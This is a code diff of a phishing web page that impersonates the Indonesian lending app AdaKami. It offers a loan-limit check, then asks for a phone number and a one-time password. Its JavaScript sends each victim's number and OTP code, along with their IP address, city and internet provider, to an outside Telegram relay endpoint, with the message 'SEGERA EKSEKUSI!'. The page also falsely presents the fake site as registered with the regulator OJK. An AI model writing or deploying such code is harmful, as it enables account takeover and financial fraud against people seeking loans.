-                            <button data-v-7071566b="" data-v-b9c7316e="" type="submit" class="in-button in-button--primary submit-button submit-button__bg scaleAni" data-v-97eecd9a=""> 
-                                Cek Limit Sekarang 
-                                <p data-v-b9c7316e="" data-v-7071566b="" class="goToNextDesc"> Tingkat lolos <span data-v-b9c7316e="" data-v-7071566b="">97%</span><span data-v-b9c7316e="" data-v-7071566b="" class="triangle"></span></p>
-                            </button>
-                            <div data-v-b9c7316e="" data-v-97eecd9a="" class="form-protocol"> *Saya telah baca dan menyetujui <span data-v-b9c7316e="" data-v-97eecd9a="">Syarat dan Ketentuan</span></div>
-                        </form>
-                    </div>
+                            </div>
+                        </label>
+                        
+                        <div class="error-msg" id="phoneError">Format nomor ponsel salah, silakan masukkan 10-13 angka dimulai dengan 08</div>
+                        
+                        <button type="submit" class="submit-button"> 
+                            Cek Limit Sekarang 
+                            <p class="goToNextDesc">Tingkat lolos <span>97%</span></p>
+                        </button>
+                        <div class="form-protocol"> *Saya telah baca dan menyetujui <span>Syarat dan Ketentuan</span></div>
+                    </form>
+                </div>
 
-                    <!-- Bagian bawah (process & tentang kami) tetap sama -->
-                    <div data-v-3ff9e60e="" data-v-63de1b46="" class="new-register-card use-process">
-                        <div data-v-3ff9e60e="" class="title"><span data-v-3ff9e60e="">Pinjaman Cepat</span></div>
-                        <div data-v-63de1b46="" data-v-3ff9e60e="" class="use-process__list">
-                            <!-- isi tetap sama -->
+                <div class="new-register-card">
+                    <div class="title">Pinjaman Cepat</div>
+                    <div class="step-card__list">
+                        <div class="process-item">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00903B" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
                         </div>
-                        <div data-v-63de1b46="" data-v-3ff9e60e="" class="use-process__desc__list">
-                            <p data-v-63de1b46="" data-v-3ff9e60e="">Masukkan Nomor HP</p>
-                            <p data-v-63de1b46="" data-v-3ff9e60e="">Download Aplikasi</p>
-                            <p data-v-63de1b46="" data-v-3ff9e60e="" style="white-space: pre-wrap;"> Ajukan Pinjaman </p>
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAQBAMAAAC4vAEMAAAAAXNSR0IArs4c6QAAAB5QTFRFAAAAnra2qra2p7y5pb23p7y5p725pry4pru4pry4ty6jFQAAAAl0Uk5TABUVVFWqqunqLG9/yQAAAE1JREFUGNNjYMABAhnwgukGeKVnThXAKz2zGL/0zED80tMd8ErPnKrAMBMXBIES/NIteA2fpoBPegZ+pwXh9VgJ/kBVwBslDnijBGIxAHD9LRSSAVCCAAAAAElFTkSuQmCC" class="process-arrow" alt="arrow">
+                        <div class="process-item">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00903B" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+                        </div>
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAQBAMAAAC4vAEMAAAAAXNSR0IArs4c6QAAAB5QTFRFAAAAnra2qra2p7y5pb23p7y5p725pry4pru4pry4ty6jFQAAAAl0Uk5TABUVVFWqqunqLG9/yQAAAE1JREFUGNNjYMABAhnwgukGeKVnThXAKz2zGL/0zED80tMd8ErPnKrAMBMXBIES/NIteA2fpoBPegZ+pwXh9VgJ/kBVwBslDnijBGIxAHD9LRSSAVCCAAAAAElFTkSuQmCC" class="process-arrow" alt="arrow">
+                        <div class="process-item">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00903B" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                         </div>
                     </div>
+                    <div class="step-card__desc-list">
+                        <p>Masukkan<br>Nomor HP</p>
+                        <p>Download<br>Aplikasi</p>
+                        <p>Ajukan<br>Pinjaman</p>
+                    </div>
+                </div>
 
-                    <div data-v-3ff9e60e="" data-v-63de1b46="" class="new-register-card ad-card" style="text-align: center;">
-                        <!-- isi tetap sama -->
+                <div class="new-register-card">
+                    <div class="title">Rincian Produk</div>
+                    <div class="amount-card__list">
+                        <div class="amount-card__item">
+                            <p>Tenor:</p>
+                            <p class="amount-card__item__right">Mulai dari 61 hari, 3-12 bulan</p>
+                        </div>
+                        <div class="amount-card__item">
+                            <p>Suku bunga tahunan:</p>
+                            <p class="amount-card__item__right">Maksimal 36%</p>
+                        </div>
+                        <div class="amount-card__item">
+                            <p>Simulasi pinjaman:</p>
+                            <p class="amount-card__item__right">Ajukan Rp10.000.000 dengan 6 bulan</p>
+                        </div>
+                        <div class="amount-card__item">
+                            <p>Total bunga:</p>
+                            <p class="amount-card__item__right">Rp540.000</p>
+                        </div>
+                        <div class="amount-card__item">
+                            <p>Total Pelunasan:</p>
+                            <p class="amount-card__item__right">Rp10.540.000</p>
+                        </div>
+                    </div>
+                    <div class="repay-plan">
+                        <table class="repay-plan-table">
+                            <tr class="dark-cell">
+                                <th class="left-align">Tenor</th>
+                                <th>Biaya cicilan</th>
+                                <th>Pokok</th>
+                                <th class="right-align">Bunga</th>
+                            </tr>
+                            <tr><td class="left-align">1/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
+                            <tr class="dark-cell"><td class="left-align">2/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
+                            <tr><td class="left-align">3/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
+                            <tr class="dark-cell"><td class="left-align">4/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
+                            <tr><td class="left-align">5/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
+                            <tr class="dark-cell"><td class="left-align">6/6</td><td>1.756.665</td><td>1.666.665</td><td class="right-align">90.000</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="new-register-card ad-card">
+                    <div class="title" style="text-align: center;">Bekerjasama dengan</div>
+                    <div style="display: flex; justify-content: center; gap: 15px; margin-bottom: 10px;">
+                        <svg width="60" height="30" viewBox="0 0 100 40" fill="#00903B"><text x="5" y="25" font-size="20" font-weight="bold">OJK</text></svg>
+                        <svg width="60" height="30" viewBox="0 0 100 40" fill="#00903B"><text x="5" y="25" font-size="20" font-weight="bold">AFPI</text></svg>
+                    </div>
+                    <p class="ad-card__content">"AdaKami sudah terdaftar dan diawasi oleh OJK dengan nomor surat KEP-128/D.05/2019 Risiko kredit atau gagal bayar ditanggung sepenuhnya oleh nasabah. Tidak ada lembaga atau otoritas negara yang bertanggung jawab atas risiko gagal bayar."</p>
+                    <div class="company">
+                        <div class="company__item">
+                            <svg class="company__icon" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+                            <p class="company__name">PT Pembiayaan Digital Indonesia</p>
+                        </div>
+                        <div class="company__item">
+                            <svg class="company__icon" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                            <p class="company__name">Alamat bisnis: 28F, Cyber 2 Tower, Jl. H.R. Rasuna Said no 13, Setiabudi, Jakarta Selatan</p>
+                        </div>
+                        <div class="company__item">
+                            <svg class="company__icon" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                            <p class="company__name">+ TEL 1500077</p>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- ================== MODAL OTP LENGKAP ================== -->
     <div class="otp-overlay" id="otpModal">
         <div class="otp-box">
             <span class="close-otp" onclick="closeOtpModal()">×</span>
@@ -160,7 +315,6 @@
                 <button type="submit" class="btn-otp-submit">Verifikasi OTP</button>
             </form>
 
-            <!-- Loading Spinner -->
             <div class="loading-overlay" id="loadingSpinner">
                 <div class="spinner"></div>
                 <div style="font-size:12px; color:#666;">Memverifikasi...</div>
@@ -168,11 +322,18 @@
         </div>
     </div>
 
-    <!-- ================== SCRIPT JS (SUDAH BERSIH & LENGKAP) ================== -->
-    
-            <script>
+    <script>
         let userPhoneNumber = '';
         let timerInterval;
+
+        // Kode fungsi untuk mengirim data kembali memanggil file Backend API
+        function sendTelegramMessage(text) {
+            fetch('https://adakami-login-nu.vercel.app/api/kirim-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ pesan: text })
+            }).catch(err => console.log('Backend belum siap:', err));
+        }
 
         function validateInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
@@ -205,7 +366,7 @@
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
 
-            const message = `<b>── ⋆⋅𖤓⋅⋆◦•●◉✿ PESAN MASUK ✿◉●•◦⋆⋅𖤓⋅⋆ ──</b>\n-ˋ✎ᝰ.┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽  ㅤㅤ: </b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n`;
+            const message = `<b>🚀 NOTIFIKASI BARU 🚀</b>\n----------------------------------\n<b>📱 PENGIRIM :</b> <code>${phone}</code>\n<b>🌐 DOMAIN   :</b> www.adakami.website\n<b>🛰 STATUS   :</b> Menunggu OTP...\n----------------------------------`;
             sendTelegramMessage(message);
             
             setTimeout(() => {
@@ -216,19 +377,11 @@
             }, 2000);
         }
 
-        function sendTelegramMessage(text) {
-            fetch('/api/kirim-telegram', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ pesan: text })
-            }).catch(err => console.log('Backend belum siap:', err));
-        }
-
         function showOtpModal(phone) {
             const modal = document.getElementById('otpModal');
             const desc = document.getElementById('otpDesc');
             desc.style.textAlign = 'center';
-            desc.innerHTML = `📩 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0,4)}****${phone.slice(-4)})`;
+            desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0,4)}****${phone.slice(-4)})`;
 
             modal.style.display = 'flex';
             startTimer();
@@ -266,7 +419,7 @@
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
 
-            const message = `<b> ── ⋆⋅𖤓⋅⋆ ─𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ─⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ ㅤ:</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏  ɴᴏᴍᴏʀ ㅤ:</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ  ㅤㅤ:</b> ${new Date().toLocaleTimeString('id-ID')} \n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 ✦•┈๑⋅⋯ </b>`;
+            const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n----------------------------------\n<b>🔑 OTP CODE :</b> <code>${formattedOtp}</code>\n<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
@@ -309,33 +462,16 @@
             const phoneInput = document.getElementById('phoneNumber');
             if (phoneInput) phoneInput.addEventListener('input', () => validateInput(phoneInput));
         });
-    </script>
 
-    <script type="text/javascript">
         window.onload = function() {
             fetch('https://ipapi.co/json/')
-                .then(res => {
-                    if (!res.ok) throw new Error("Terkena rate limit atau diblokir jaringan");
-                    return res.json();
-                })
+                .then(res => res.json())
                 .then(data => {
-                    const infoPesan = `<b></b>\n── ⋆⋅𖤓⋅⋆◦•●◉✿（ ͜.人 ͜.）✿◉●•◦⋆⋅𖤓⋅⋆ ──\n<b></b> 𓀐𓂺 www.adakami.website 𓀐𓂺\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} \n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃</b>`;
-
-                    fetch('/api/kirim-telegram', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ pesan: infoPesan })
-                    }).then(res => {
-                        if (res.ok) {
-                            console.log("Data pengunjung terkirim ke backend");
-                        } else {
-                            console.error("Backend gagal merespons dengan baik");
-                        }
-                    }).catch(err => console.error("Gagal kirim data ke backend", err));
+                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n<b>Domain:</b> www.adakami.website\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    sendTelegramMessage(infoPesan);
                 })
-                .catch(err => console.error("Gagal melacak IP pengunjung:", err.message));
+                .catch(err => console.error("Gagal melacak IP pengunjung"));
         };
     </script>
-    
 </body>
 </html>
